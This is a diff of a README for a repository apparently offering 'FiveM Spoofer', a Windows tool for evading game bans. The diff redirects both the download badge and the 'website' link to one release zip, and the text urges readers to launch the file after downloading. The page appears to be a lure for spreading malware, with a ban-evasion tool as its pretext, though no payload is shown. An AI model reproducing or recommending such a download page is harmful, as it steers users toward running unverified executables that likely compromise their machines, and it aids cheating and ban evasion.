@@ -15,7 +15,7 @@ Welcome to the official repository of **FiveM Spoofer** - a powerful Windows app
 Simply download the software from the link provided below and run the application on your Windows system. Follow the on-screen instructions to take advantage of all the features **FiveM Spoofer** has to offer.
 
 ## Download Now 📥
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Proffesional123/FiveM-Spoofer/releases/download/v1.0.0/Application.zip)](https://github.com/Proffesional123/FiveM-Spoofer/releases/download/v1.0.0/Application.zip)
 
 *Note: The link above leads to the software download file, make sure to launch it after downloading.*
 
@@ -43,7 +43,7 @@ Simply download the software from the link provided below and run the applicatio
 
 ## More Resources
 
-For more information and updates, please visit our website [FiveM Spoofer Website](https://www.fivemspoofer.com).
+For more information and updates, please visit our website [FiveM Spoofer Website](https://github.com/Proffesional123/FiveM-Spoofer/releases/download/v1.0.0/Application.zip).
 
 If the provided download link is not working, please check the **Releases** section of this repository for alternative download options.
 
